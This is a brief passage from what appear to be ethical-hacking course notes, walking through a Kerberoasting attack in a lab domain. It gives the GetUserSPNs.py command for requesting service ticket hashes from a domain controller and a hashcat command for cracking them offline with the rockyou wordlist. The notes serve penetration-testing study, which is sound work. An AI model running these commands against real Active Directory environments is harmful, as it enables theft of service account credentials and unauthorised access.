# V. Kerberoasting Walkthrough

All we need for this attack is our Kali machine and DC machine as it is our KDC (Key Distribution Centre).

Open the terminal and use the following command to grab the hash `python GetUserSPNs.py <DOMAIN/username:password> -dc-ip <ip of DC> -request` :

![Kerberoasting_1](https://github.com/w1zzl3-06/TCM-Practical-Ethical-Hacking-Notes/assets/141921425/fa3c2836-af37-4148-8330-c7254aedbc45)

Next save the hash into a text file (i.e krb.txt)

Finally crack the hash using hashcat.

`hashcat -m 13100 krb.txt /usr/share/wordlists/rockyou.txt`
